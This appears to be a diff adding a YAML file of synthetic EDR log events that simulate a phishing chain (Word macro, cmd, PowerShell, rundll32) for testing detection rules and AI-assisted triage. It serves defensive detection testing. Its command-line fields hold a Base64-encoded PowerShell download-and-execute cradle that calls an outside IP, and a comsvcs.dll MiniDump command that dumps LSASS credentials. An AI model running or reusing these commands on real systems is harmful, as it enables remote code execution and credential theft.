@@ -1,0 +1,128 @@
+# ─────────────────────────────────────────────────────────────────────────────
+# EDR Process Tree Demo — Spearphishing → Macro → LOLBAS → LSASS Dump
+#
+# Run with:
+#   python3 send_edr_events.py --events-file edr_process_tree_demo.yml
+#
+# Attack chain:
+#   WINWORD.EXE (4832)
+#     └── cmd.exe (6124)              [VBA macro spawns shell]
+#           └── powershell.exe (7456) [Base64 beacon → FIRES EDR.UDM.Base64.Encoded.Cmdline]
+#                 └── rundll32.exe (8912) [LSASS dump → FIRES EDR.UDM.Credential.Dumping.Tool]
+#                       └── FILE: C:\Windows\Temp\lsass.dmp
+#
+# All events share storylineId: 3F9A2B1C4D5E6F7A8B9C0D1E2F3A4B5C
+# so Panther AI Triage can correlate and narrate the full chain.
+# ─────────────────────────────────────────────────────────────────────────────
+
+events:
+
+  - id: pt_01_winword_launch
+    description: "PT Step 1 — WINWORD opens phishing doc (initial access)"
+    malicious: false
+    scenario: process_tree_demo
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      eventType: ProcessCreation
+      "src.process.name": WINWORD.EXE
+      "src.process.pid": "4832"
+      "src.process.image.path": C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+      "src.process.cmdline": "WINWORD.EXE /n C:\\Users\\jsmith\\Downloads\\Q4_2024_Financial_Results_FINAL.docx"
+      "src.process.user": BEAZLEY\jsmith
+      "src.process.parent.name": explorer.exe
+      "src.process.parent.pid": "3104"
+      "src.process.parent.cmdline": "C:\\Windows\\explorer.exe"
+      "src.process.storylineId": "3F9A2B1C4D5E6F7A8B9C0D1E2F3A4B5C"
+      "src.process.image.sha256": a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
+      "endpoint.name": BWKSTN-042
+      "endpoint.os": windows
+      "agent.uuid": "s1-agent-beazley-042"
+
+  - id: pt_02_cmd_spawned
+    description: "PT Step 2 — cmd.exe spawned by Word macro (execution)"
+    malicious: false
+    scenario: process_tree_demo
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      eventType: ProcessCreation
+      "src.process.name": cmd.exe
+      "src.process.pid": "6124"
+      "src.process.image.path": C:\Windows\System32\cmd.exe
+      "src.process.cmdline": "cmd.exe /c powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMTA="
+      "src.process.user": BEAZLEY\jsmith
+      "src.process.parent.name": WINWORD.EXE
+      "src.process.parent.pid": "4832"
+      "src.process.parent.cmdline": "WINWORD.EXE /n C:\\Users\\jsmith\\Downloads\\Q4_2024_Financial_Results_FINAL.docx"
+      "src.process.storylineId": "3F9A2B1C4D5E6F7A8B9C0D1E2F3A4B5C"
+      "src.process.image.sha256": b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3
+      "endpoint.name": BWKSTN-042
+      "endpoint.os": windows
+      "agent.uuid": "s1-agent-beazley-042"
+
+  - id: pt_03_powershell_b64
+    description: "PT Step 3 — PowerShell -enc C2 beacon [FIRES Base64 detection]"
+    malicious: true
+    expected_detection: EDR.UDM.Base64.Encoded.Cmdline
+    scenario: process_tree_demo
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      eventType: ProcessCreation
+      "src.process.name": powershell.exe
+      "src.process.pid": "7456"
+      "src.process.image.path": C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      "src.process.cmdline": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAxADYALgAyADkALgAxADkANAAuADEAMAA3AC8AcABhAHkAbABvAGEAZAAnACkA"
+      "src.process.user": BEAZLEY\jsmith
+      "src.process.parent.name": cmd.exe
+      "src.process.parent.pid": "6124"
+      "src.process.parent.cmdline": "cmd.exe /c powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMTA="
+      "src.process.storylineId": "3F9A2B1C4D5E6F7A8B9C0D1E2F3A4B5C"
+      "src.process.image.sha256": c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4
+      "endpoint.name": BWKSTN-042
+      "endpoint.os": windows
+      "agent.uuid": "s1-agent-beazley-042"
+      "networkConnectedIp": "116.29.194.107"
+      "networkConnectedPort": "443"
+
+  - id: pt_04_rundll32_lsass
+    description: "PT Step 4 — rundll32 comsvcs LSASS dump [FIRES Cred Dump detection]"
+    malicious: true
+    expected_detection: EDR.UDM.Credential.Dumping.Tool
+    scenario: process_tree_demo
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      eventType: ProcessCreation
+      "src.process.name": rundll32.exe
+      "src.process.pid": "8912"
+      "src.process.image.path": C:\Windows\System32\rundll32.exe
+      "src.process.cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"
+      "src.process.user": BEAZLEY\jsmith
+      "src.process.parent.name": powershell.exe
+      "src.process.parent.pid": "7456"
+      "src.process.parent.cmdline": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAxADYALgAyADkALgAxADkANAAuADEAMAA3AC8AcABhAHkAbABvAGEAZAAnACkA"
+      "src.process.storylineId": "3F9A2B1C4D5E6F7A8B9C0D1E2F3A4B5C"
+      "src.process.image.sha256": d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5
+      "endpoint.name": BWKSTN-042
+      "endpoint.os": windows
+      "agent.uuid": "s1-agent-beazley-042"
+      "tgt.process.name": lsass.exe
+      "tgt.process.pid": "624"
+      "tgt.process.image.path": C:\Windows\System32\lsass.exe
+
+  - id: pt_05_lsass_file_drop
+    description: "PT Step 5 — lsass.dmp credential dump written to disk (file event)"
+    malicious: false
+    scenario: process_tree_demo
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      eventType: FileCreation
+      "src.process.name": rundll32.exe
+      "src.process.pid": "8912"
+      "src.process.user": BEAZLEY\jsmith
+      "src.process.storylineId": "3F9A2B1C4D5E6F7A8B9C0D1E2F3A4B5C"
+      "endpoint.name": BWKSTN-042
+      "endpoint.os": windows
+      "agent.uuid": "s1-agent-beazley-042"
+      "tgt.file.path": C:\Windows\Temp\lsass.dmp
+      "tgt.file.sha256": e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6
+      "tgt.file.size": "63291392"
+      "tgt.file.extension": dmp
